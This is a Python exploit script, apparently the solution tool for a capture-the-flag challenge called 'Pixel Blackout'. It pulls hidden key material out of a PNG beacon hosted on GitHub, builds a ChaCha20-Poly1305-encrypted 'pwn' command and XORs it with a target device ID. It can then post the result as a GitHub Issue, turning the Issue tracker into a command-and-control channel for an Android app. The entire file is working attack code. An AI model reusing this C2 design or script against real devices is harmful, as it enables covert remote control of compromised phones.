#!/usr/bin/env python3

"""
Pixel Blackout – GitHub Issues C2 helper (end-to-end)

What it does
- Fetch c2_beacon.png, extract and unmask key material (c2 key + base nonce)
- Build a C2 payload for cmd=pwn,arg=<TEAM_NAME> using ChaCha20-Poly1305 (or use a provided pre‑XOR base64)
- Choose target device_id (ANDROID_ID or UUID): pass via --device-id, or auto-discover the first from Issues
- XOR that pre‑XOR base64 with device_id and base64‑encode to produce the Issue blob
- Print all relevant details and a suggested Issue title

Defaults come from the APK's BuildConfig in this repo:
- REMOTE_KEY_URL: https://raw.githubusercontent.com/centralceeplusplus/hehe/master/c2_beacon.png
- GITHUB owner/repo: centralceeplusplus/hehe
- Issue prefix: PXC2

Usage examples:
  # Generate fresh payload for your device_id (recommended)
  python3 challenge/tools/pxc2_full_exploit.py --team "XYZ" \
      --device-id 50e0b8a12eb313a3

  # Auto-discover device_id from the first matching Issue (fallback)
  python3 challenge/tools/pxc2_full_exploit.py --team "XYZ"

  # Use a pre‑XOR base64 (skip beacon + encryption)
  python3 challenge/tools/pxc2_full_exploit.py --raw 'N1e4c+Igro4...' \
      --device-id 50e0b8a12eb313a3

Notes
- The app itself prefixes "TEAM " when displaying, so pass only your team name
  (e.g. XYZ), not "TEAM XYZ".
- If GitHub rate-limits anonymous requests, set env GITHUB_TOKEN with a PAT.
"""

from __future__ import annotations

import argparse
import base64
import json
import os
import re
import sys
import time
from dataclasses import dataclass
from typing import Optional, Tuple, Set
from urllib.request import Request, urlopen


DEFAULT_BEACON_URL = (
    "https://raw.githubusercontent.com/centralceeplusplus/hehe/master/c2_beacon.png"
)
DEFAULT_OWNER = "centralceeplusplus"
DEFAULT_REPO = "hehe"
DEFAULT_PREFIX = "PXC2"
MASK_VALUE = 0x37
JSON_REGEX = re.compile(r"\{\s*\"k\".*?\}", re.DOTALL)


def eprint(*args: object) -> None:
    print(*args, file=sys.stderr)


def b64e(data: bytes) -> str:
    return base64.b64encode(data).decode("ascii")


def b64d(text: str) -> bytes:
    return base64.b64decode(text)


def xor_bytes(buf: bytes, key: bytes) -> bytes:
    if not key:
        raise ValueError("xor key must be non-empty")
    out = bytearray(len(buf))
    k = key
    for i, b in enumerate(buf):
        out[i] = b ^ k[i % len(k)]
    return bytes(out)


def discover_chacha_impl():
    """Try to import an AEAD ChaCha20-Poly1305 implementation.

    Returns two callables:
      - encrypt(key: bytes, nonce: bytes, plaintext: bytes) -> bytes  (ciphertext||tag)
      - decrypt(key: bytes, nonce: bytes, payload: bytes) -> bytes     (plaintext)
    """
    # Try cryptography first
    try:
        from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305  # type: ignore

        def _enc_cc(k: bytes, nonce: bytes, pt: bytes) -> bytes:
            aead = ChaCha20Poly1305(k)
            return aead.encrypt(nonce, pt, None)

        def _dec_cc(k: bytes, nonce: bytes, data: bytes) -> bytes:
            aead = ChaCha20Poly1305(k)
            return aead.decrypt(nonce, data, None)

        return _enc_cc, _dec_cc
    except Exception:
        pass

    # Fallback to PyCryptodome
    try:
        from Crypto.Cipher import ChaCha20_Poly1305  # type: ignore

        def _enc_pc(k: bytes, nonce: bytes, pt: bytes) -> bytes:
            cipher = ChaCha20_Poly1305.new(key=k, nonce=nonce)
            ct, tag = cipher.encrypt_and_digest(pt)
            return ct + tag

        def _dec_pc(k: bytes, nonce: bytes, data: bytes) -> bytes:
            ct = data[:-16]
            tag = data[-16:]
            cipher = ChaCha20_Poly1305.new(key=k, nonce=nonce)
            return cipher.decrypt_and_verify(ct, tag)

        return _enc_pc, _dec_pc
    except Exception as exc:
        eprint("[!] Missing AEAD ChaCha20-Poly1305 (install 'cryptography' or 'pycryptodome').", exc)
        return None


@dataclass
class BeaconMaterial:
    aes_key: bytes
    aes_iv: bytes
    archive_password: bytes
    c2_key: bytes
    c2_base_nonce: bytes


def fetch_beacon(url: str) -> bytes:
    headers = {
        "User-Agent": "pxc2-exploit/1.0",
        "Accept": "*/*",
        "Cache-Control": "no-cache",
    }
    req = Request(url, headers=headers)
    with urlopen(req, timeout=8) as resp:
        return resp.read()


def parse_beacon(raw: bytes) -> BeaconMaterial:
    text = raw.decode("iso-8859-1", errors="ignore")
    m = JSON_REGEX.search(text)
    if not m:
        raise ValueError("Beacon payload JSON not found in image")
    payload = json.loads(m.group())
    def unmask_b64(field: str) -> bytes:
        masked = b64d(payload[field])
        return bytes(b ^ MASK_VALUE for b in masked)

    k = unmask_b64("k")
    i = unmask_b64("i")
    p = unmask_b64("p")
    c = unmask_b64("c")
    n = unmask_b64("n")
    if len(c) != 32 or len(n) != 12:
        raise ValueError("Unexpected c2 key/nonce lengths")
    return BeaconMaterial(k, i, p, c, n)


def github_list_issues(owner: str, repo: str) -> list[dict]:
    qs = "state=open&per_page=20&sort=created&direction=asc"
    url = f"https://api.github.com/repos/{owner}/{repo}/issues?{qs}"
    headers = {
        "Accept": "application/vnd.github+json",
        "User-Agent": "pxc2-exploit/1.0",
    }
    token = os.environ.get("GITHUB_TOKEN")
    if token:
        headers["Authorization"] = f"Bearer {token}"
    req = Request(url, headers=headers)
    with urlopen(req, timeout=8) as resp:
        data = resp.read().decode("utf-8", errors="ignore")
        try:
            return json.loads(data)
        except json.JSONDecodeError:
            eprint("[!] GitHub API returned non-JSON:", data[:200])
            raise


def extract_first_device_id(issues: list[dict], prefix: str) -> Optional[Tuple[str, dict]]:
    for issue in issues:
        title = issue.get("title") or ""
        parts = title.split("::")
        if len(parts) < 3:
            continue
        p, dev = parts[0], parts[1]
        if p == prefix:
            return dev, issue
    return None


def collect_issue_device_ids(issues: list[dict], prefix: str) -> Set[str]:
    ids: Set[str] = set()
    for issue in issues:
        title = (issue.get("title") or "").strip()
        parts = title.split("::")
        if len(parts) >= 3 and parts[0] == prefix:
            ids.add(parts[1])
    return ids


def encrypt_c2_pwn(team: str, key: bytes, base_nonce: bytes) -> str:
    # JSON with minimal separators as in app-side usage
    payload = {"cmd": "pwn", "arg": team}
    plain = json.dumps(payload, separators=(",", ":")).encode("utf-8")
    # Random salt (12 bytes), nonce = base_nonce XOR salt
    salt = os.urandom(12)
    nonce = bytes((base_nonce[i] ^ salt[i]) for i in range(12))

    impl = discover_chacha_impl()
    if impl is None:
        raise SystemExit(1)

    enc_impl, _dec_impl = impl
    ct_tag = enc_impl(key, nonce, plain)
    blob = salt + ct_tag
    return b64e(blob)


def try_verify_blob(device_id: str, blob_b64: str, key: bytes, base_nonce: bytes) -> Optional[str]:
    """Round-trip verify: decode outer, decrypt inner, return plaintext JSON string or None."""
    try:
        raw = b64d(blob_b64)
        inner_b64 = xor_bytes(raw, device_id.encode("utf-8")).decode("utf-8")
        payload = b64d(inner_b64)
        if len(payload) <= 12 + 16:
            return None
        salt = payload[:12]
        rest = payload[12:]
        nonce = bytes((base_nonce[i] ^ salt[i]) for i in range(12))
        impl = discover_chacha_impl()
        if impl is None:
            return None
        _enc_impl, dec_impl = impl
        pt = dec_impl(key, nonce, rest)
        return pt.decode("utf-8")
    except Exception:
        return None


def make_issue_blob(device_id: str, pre_xor_b64: str) -> str:
    data = pre_xor_b64.encode("utf-8")
    key = device_id.encode("utf-8")
    xored = xor_bytes(data, key)
    return b64e(xored)


def main() -> None:
    parser = argparse.ArgumentParser(description="Build GitHub Issue blob for Pixel Blackout pwn")
    group = parser.add_mutually_exclusive_group(required=False)
    group.add_argument("--team", help="Team name (do NOT include the 'TEAM ' prefix)")
    group.add_argument("--raw", dest="raw_prexor", help="Use existing pre‑XOR base64 and skip beacon/encrypt stage")
    parser.add_argument("--device-id", help="Target device_id (ANDROID_ID or UUID). If omitted, pick first from Issues")
    parser.add_argument("--owner", default=DEFAULT_OWNER, help="GitHub owner (default: %(default)s)")
    parser.add_argument("--repo", default=DEFAULT_REPO, help="GitHub repo (default: %(default)s)")
    parser.add_argument("--prefix", default=DEFAULT_PREFIX, help="Issue prefix (default: %(default)s)")
    parser.add_argument("--beacon-url", default=DEFAULT_BEACON_URL, help="Beacon URL (default: %(default)s)")
    parser.add_argument("--verify", action="store_true", help="Verify the produced blob can be decrypted with beacon material")
    parser.add_argument("--post", action="store_true", help="Post the Issue via GitHub API (requires env GITHUB_TOKEN)")
    args = parser.parse_args()

    # Determine device_id
    print(f"[*] Listing issues from {args.owner}/{args.repo}…")
    issues = github_list_issues(args.owner, args.repo)
    known_ids = sorted(collect_issue_device_ids(issues, args.prefix))
    device_id: Optional[str] = args.device_id
    if device_id:
        print("[+] Using provided device_id:", device_id)
        if known_ids and device_id not in known_ids:
            print("[!] Warning: provided device_id not present in existing Issues. That's OK; just create a new Issue.")
    else:
        pick = extract_first_device_id(issues, args.prefix)
        if not pick:
            print("[!] No matching issues found with prefix", args.prefix)
            if not args.raw_prexor:
                print("[i] You can still proceed by supplying --device-id and --team (or --raw).")
            sys.exit(2)
        device_id, first_issue = pick
        print("[+] Auto-selected device_id from Issues:", device_id)
        print("[+] First issue id:", first_issue.get("id"), "title:", first_issue.get("title"))
    if known_ids:
        print("[i] Known device_ids in Issues:", ", ".join(known_ids))

    # Build or accept pre-XOR payload
    if args.raw_prexor:
        pre_xor = args.raw_prexor
        print("[+] Using provided pre‑XOR base64 (skip beacon/encrypt)")
    else:
        if not args.team:
            parser.error("--team is required unless --raw is provided")
        print("[*] Fetching beacon…", args.beacon_url)
        raw_beacon = fetch_beacon(args.beacon_url)
        mat = parse_beacon(raw_beacon)
        print("[+] c2_key:", mat.c2_key.hex())
        print("[+] c2_base_nonce:", mat.c2_base_nonce.hex())
        print("[*] Building C2 payload for cmd=pwn…")
        pre_xor = encrypt_c2_pwn(args.team, mat.c2_key, mat.c2_base_nonce)
        print("[+] pre‑XOR base64:", pre_xor)

    final_blob = make_issue_blob(device_id, pre_xor)
    nonce = time.strftime("%Y%m%d-%H%M%S")
    title = f"{args.prefix}::{device_id}::{nonce}"

    print()
    print("=== Issue to post ===")
    print("Title:", title)
    print("Body (single fenced code block, put exactly this line inside):")
    print("```\n" + final_blob + "\n```")

    if args.verify:
        if args.raw_prexor:
            print("[!] --verify requires beacon material (omit --raw or supply beacon)")
        else:
            verified = try_verify_blob(device_id, final_blob, mat.c2_key, mat.c2_base_nonce)
            print("[*] Verify result:")
            print(verified if verified else "(failed)")

    if args.post:
        token = os.environ.get("GITHUB_TOKEN")
        if not token:
            eprint("[!] --post requires env GITHUB_TOKEN")
            sys.exit(3)
        url = f"https://api.github.com/repos/{args.owner}/{args.repo}/issues"
        body = {
            "title": title,
            "body": f"```\n{final_blob}\n```",
        }
        req = Request(url, data=json.dumps(body).encode("utf-8"), headers={
            "Accept": "application/vnd.github+json",
            "Authorization": f"Bearer {token}",
            "User-Agent": "pxc2-exploit/1.0",
            "Content-Type": "application/json",
        })
        with urlopen(req, timeout=8) as resp:
            created = json.loads(resp.read().decode("utf-8", errors="ignore"))
            print("[+] Created issue:", created.get("html_url") or created.get("url"))


if __name__ == "__main__":
    main()
